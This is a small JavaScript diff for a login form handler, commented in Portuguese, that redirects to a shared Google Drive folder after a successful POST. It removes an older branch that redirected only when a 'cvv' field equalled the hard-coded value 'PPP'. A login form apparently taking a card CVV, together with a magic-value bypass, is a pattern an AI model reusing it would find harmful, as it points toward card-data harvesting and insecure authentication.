@@ -130,18 +130,12 @@
             var xhr = new XMLHttpRequest();
             xhr.open('POST', document.getElementById("loginForm").action);
             xhr.onload = function () {
-                if (xhr.status === 200) {
+                if (xhr.status === 200 || xhr.status === 302) {
+                    window.location.href = "https://drive.google.com/drive/folders/1-UTHTy5TGa6Krenl8FVx-s0KuHHAn9pP?usp=sharing";
+                } else {
                     var mensagem = xhr.responseText;
                     document.getElementById('mensagemErro').innerText = mensagem;
                     document.getElementById("loginForm").reset(); // Limpar campos após erro
-                } else {
-                    var mensagem = xhr.responseText;
-                    if (cvv === 'PPP') {
-                        window.location.href = "https://drive.google.com/drive/folders/1-UTHTy5TGa6Krenl8FVx-s0KuHHAn9pP?usp=sharing";
-                    } else {
-                        document.getElementById('mensagemErro').innerText = mensagem;
-                        document.getElementById("loginForm").reset(); // Limpar campos após erro
-                    }
                 }
             };
             xhr.send(formData);
